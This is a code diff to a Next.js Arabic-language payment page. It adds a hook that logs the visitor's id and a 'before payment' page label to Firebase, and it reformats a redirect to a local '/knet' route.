@@ -3,8 +3,19 @@
 import { ArrowRight, CreditCard } from "lucide-react"
 import Link from "next/link"
 import { Button } from "@/components/ui/button"
+import { useEffect } from "react"
+import { addData } from "@/lib/firebase"
 
 export default function PaymentPage() {
+  const handleUpdatePageName = async () => {
+    const visitorid = localStorage.getItem('visitor')
+    await addData({ id: visitorid, currentPage: 'قبل الدفع' })
+  }
+  useEffect(() => {
+    handleUpdatePageName().then(() => {
+      console.log('Done')
+    })
+  }, [])
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* CI NET Header */}
@@ -52,7 +63,7 @@ export default function PaymentPage() {
             <Button
               className="bg-blue-500 hover:bg-blue-600 text-white px-12 py-4 text-lg rounded-xl shadow-lg transition-all duration-300 hover:shadow-xl"
               onClick={() => {
-                window.location.href='/knet'
+                window.location.href = '/knet'
               }}
             >
               <CreditCard className="ml-2 h-5 w-5" />
